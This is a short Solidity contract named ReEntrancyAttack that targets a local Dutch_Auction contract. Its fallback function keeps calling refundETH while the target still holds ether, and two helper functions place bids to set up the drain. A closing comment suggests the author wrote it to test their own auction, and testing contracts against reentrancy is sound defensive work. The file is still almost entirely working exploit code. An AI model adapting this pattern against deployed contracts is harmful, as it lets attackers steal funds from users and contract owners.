// SPDX-License-Identifier: MITRe Entry Attack

pragma solidity ^0.8.21;

import "./Dutch_Auction.sol";

contract ReEntrancyAttack {
    Dutch_Auction target;
    address targetA;

    constructor(address payable _target) payable{
        target = Dutch_Auction(_target);
        targetA = _target;
    }

    fallback() external payable {
        if(address(targetA).balance>0){
        target.refundETH();
        }
    }

    function ReentranceAttack1() public{
        target.addBidder{value: 0.001 ether}();
    }

    function ReentranceAttack2() public{
        target.addBidder{value: 0.000000000000001 ether}();
    }



//deliberatily end auction to test

}